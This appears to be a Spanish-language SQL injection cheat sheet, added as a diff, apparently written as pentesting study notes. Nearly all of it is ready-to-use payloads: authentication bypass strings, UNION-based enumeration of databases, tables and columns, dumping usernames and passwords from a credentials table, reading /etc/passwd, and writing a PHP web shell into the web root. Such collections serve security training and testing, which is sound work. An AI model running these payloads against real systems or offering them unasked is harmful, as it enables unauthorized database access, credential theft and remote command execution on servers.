@@ -1,0 +1,43 @@
+# SQLi por Gth
+
+
+## Bypass de autenticación
+
+* Bypass básico: admin' or '1'='1
+* Bypass básico con comentarios: admin')-- -
+
+Más métodos de bypass: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass
+
+
+## Inyección con UNION
+
+* Detectar el número de columnas usando order by: ' order by 1-- -
+* Detectar el número de columnas usando inyección de UNION: cn' union select 1,2,3-- -
+* Inyección de UNION básica: cn' UNION select 1,@@version,3,4-- -
+* Inyección de UNION para 4 columnas: union select username, 2, 3, 4 from passwords-- -
+
+
+## Enumeración de bases de datos
+
+* MySQL de huellas digitales con salida de consulta: select @@version
+* MySQL de huellas digitales sin salida: SELECT SLEEP(5)
+* Nombre de la base de datos actual: cn' UNION select 1,database(),2,3-- -
+* Listar todas las bases de datos: cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
+* Listar todas las tablas en una base de datos especifica: cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
+* Listar todas las columnas en una tabla especifica: cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
+* Volcar datos de una tabla en otra base de datos: cn' UNION select 1, username, password, 4 from dev.credentials-- -
+
+
+## Privilegios
+
+* Encontrar el usuario actual: cn' UNION SELECT 1, user(), 3, 4-- -
+* Encontrar si el usuario tiene permisos de administrador: cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
+* Buscar si todos los privilegios de usuario: cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
+* Encontrar que ficheros se pueden acceder desde MySQL: cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
+
+
+## File Injection
+
+* Leer un archivo local: cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
+* Escribir en un archivo local: cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
+* Escribir un shell web en el directorio web base: cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
